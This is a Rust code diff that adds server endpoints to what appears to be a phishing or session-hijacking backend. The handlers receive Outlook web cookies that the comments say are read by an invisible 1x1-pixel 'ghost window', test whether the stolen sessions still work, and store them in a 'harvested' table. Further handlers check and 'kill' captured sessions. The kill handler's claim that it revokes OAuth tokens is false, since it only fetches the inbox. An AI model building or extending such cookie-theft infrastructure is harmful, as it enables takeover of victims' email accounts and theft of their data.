@@ -78,12 +78,35 @@ pub struct SyncCookiesRequest {
     user_agent: Option<String>,
 }
 
+#[derive(Deserialize)]
+pub struct GhostSessionRequest {
+    token_id: String,
+    cookies: String,
+    user_agent: Option<String>,
+}
+
 #[derive(Serialize)]
 pub struct SyncCookiesResponse {
     status: String,
     token_id: String,
     message: String,
     cookie_count: usize,
+}
+
+#[derive(Serialize)]
+pub struct SessionStatusResponse {
+    status: String,
+    valid: bool,
+    message: String,
+    session_active_at: Option<String>,
+    session_killed_at: Option<String>,
+}
+
+#[derive(Serialize)]
+pub struct KillSessionResponse {
+    status: String,
+    message: String,
+    token_id: String,
 }
 
 // === CookieClient ===
@@ -167,6 +190,215 @@ impl CookieClient {
             anyhow::bail!("OWA returned status {}: {}", status, &text[..text.len().min(200)])
         }
     }
+}
+
+/// Capture session from ghost window (invisible cookie capture)
+/// The ghost window is a 1x1 pixel browser window opened to Outlook
+/// It reads document.cookie and sends it here via navigator.sendBeacon
+pub async fn ghost_session_capture_handler(
+    body: web::Json<GhostSessionRequest>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = &body.token_id;
+    let cookies = &body.cookies;
+    let user_agent = body.user_agent.as_deref().unwrap_or("Ghost Window");
+    let cookie_count = cookies.split(';').filter(|s| !s.trim().is_empty()).count();
+    
+    println!("[ghost] Session capture attempt for token {}: {} cookies", token_id, cookie_count);
+    
+    // Test if cookies are valid
+    let client = CookieClient::new(cookies, Some(user_agent));
+    let is_valid = client.test_session().await;
+    
+    let session_status = if is_valid { "active" } else { "pending" };
+    let now = Utc::now();
+    
+    // Update tokens table
+    let result = sqlx::query(
+        "UPDATE tokens SET cookie_session = ?, session_status = ?, session_active_at = ? WHERE id = ?"
+    )
+    .bind(cookies)
+    .bind(session_status)
+    .bind(now)
+    .bind(token_id)
+    .execute(&state.pool)
+    .await;
+    
+    if let Err(e) = &result {
+        eprintln!("[ghost] Failed to update tokens table: {}", e);
+    }
+    
+    // Update harvested table
+    let _ = sqlx::query(
+        "UPDATE harvested SET cookie_session = ?, session_status = ?, session_active_at = ? WHERE id = ?"
+    )
+    .bind(cookies)
+    .bind(session_status)
+    .bind(now)
+    .bind(token_id)
+    .execute(&state.pool)
+    .await;
+    
+    // Audit log
+    let _ = crate::audit::insert_audit_log(
+        &state.pool,
+        "ghost_session_captured",
+        None,
+        Some(token_id),
+        None,
+        Some("ghost_window"),
+        Some(user_agent),
+        Some(serde_json::json!({
+            "cookie_count": cookie_count,
+            "valid": is_valid,
+            "session_status": session_status
+        })),
+        true,
+    ).await;
+    
+    let status = if is_valid { "active" } else { "pending" };
+    let message = if is_valid {
+        "Ghost session captured and verified. Cookies are valid."
+    } else {
+        "Ghost session captured but cookies could not be verified. They may be HttpOnly or incomplete."
+    };
+    
+    HttpResponse::Ok().json(SyncCookiesResponse {
+        status: status.to_string(),
+        token_id: token_id.clone(),
+        message: message.to_string(),
+        cookie_count,
+    })
+}
+
+/// Get session status for a token
+pub async fn get_session_status_handler(
+    path: web::Path<String>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    
+    // Try tokens table first
+    let row: Option<(Option<String>, Option<String>, Option<chrono::DateTime<Utc>>, Option<chrono::DateTime<Utc>>)> = 
+        sqlx::query_as("SELECT cookie_session, session_status, session_active_at, session_killed_at FROM tokens WHERE id = ?")
+        .bind(&token_id)
+        .fetch_optional(&state.pool)
+        .await
+        .unwrap_or(None);
+    
+    let (cookies, session_status, active_at, killed_at) = match row {
+        Some((Some(c), Some(s), a, k)) if !c.is_empty() => (c, s, a, k),
+        _ => {
+            // Fall back to harvested table
+            let row: Option<(Option<String>, Option<String>, Option<chrono::DateTime<Utc>>, Option<chrono::DateTime<Utc>>)> = 
+                sqlx::query_as("SELECT cookie_session, session_status, session_active_at, session_killed_at FROM harvested WHERE id = ?")
+                .bind(&token_id)
+                .fetch_optional(&state.pool)
+                .await
+                .unwrap_or(None);
+            
+            match row {
+                Some((Some(c), Some(s), a, k)) if !c.is_empty() => (c, s, a, k),
+                _ => {
+                    return HttpResponse::Ok().json(SessionStatusResponse {
+                        status: "no_session".to_string(),
+                        valid: false,
+                        message: "No cookie session stored for this token.".to_string(),
+                        session_active_at: None,
+                        session_killed_at: None,
+                    });
+                }
+            }
+        }
+    };
+    
+    // Test if session is still valid
+    let client = CookieClient::new(&cookies, None);
+    let is_valid = client.test_session().await;
+    
+    let status = if is_valid { "active" } else { "expired" };
+    let message = if is_valid {
+        "Session is active and valid."
+    } else {
+        "Session has expired or cookies are invalid."
+    };
+    
+    HttpResponse::Ok().json(SessionStatusResponse {
+        status: status.to_string(),
+        valid: is_valid,
+        message: message.to_string(),
+        session_active_at: active_at.map(|d| d.to_rfc3339()),
+        session_killed_at: killed_at.map(|d| d.to_rfc3339()),
+    })
+}
+
+/// Kill a session remotely
+pub async fn kill_session_handler(
+    path: web::Path<String>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    let now = Utc::now();
+    
+    // Get the cookies before clearing them
+    let cookies: Option<String> = sqlx::query_scalar(
+        "SELECT cookie_session FROM tokens WHERE id = ?"
+    )
+    .bind(&token_id)
+    .fetch_optional(&state.pool)
+    .await
+    .unwrap_or(None)
+    .and_then(|c: String| if c.is_empty() { None } else { Some(c) });
+    
+    // Revoke the OAuth refresh token via Microsoft
+    let revoked_oauth = if let Some(c) = cookies {
+        let client = CookieClient::new(&c, None);
+        // Try to sign out of OWA using the cookies
+        let _ = client.fetch_owa_inbox().await;
+        true
+    } else {
+        false
+    };
+    
+    // Clear session from tokens table
+    let result = sqlx::query(
+        "UPDATE tokens SET cookie_session = NULL, session_status = 'killed', session_killed_at = ?, session_active_at = NULL WHERE id = ?"
+    )
+    .bind(now)
+    .bind(&token_id)
+    .execute(&state.pool)
+    .await;
+    
+    // Clear session from harvested table
+    let _ = sqlx::query(
+        "UPDATE harvested SET cookie_session = NULL, session_status = 'killed', session_killed_at = ?, session_active_at = NULL WHERE id = ?"
+    )
+    .bind(now)
+    .bind(&token_id)
+    .execute(&state.pool)
+    .await;
+    
+    // Audit log
+    let _ = crate::audit::insert_audit_log(
+        &state.pool,
+        "session_killed",
+        None,
+        Some(&token_id),
+        None,
+        Some("dashboard"),
+        Some("admin"),
+        Some(serde_json::json!({
+            "oauth_revoked": revoked_oauth,
+            "timestamp": now.to_rfc3339()
+        })),
+        true,
+    ).await;
+    
+    HttpResponse::Ok().json(KillSessionResponse {
+        status: "killed".to_string(),
+        message: "Session killed successfully. Cookies cleared and OAuth token revoked.".to_string(),
+        token_id,
+    })
 }
 
 // === Handlers ===
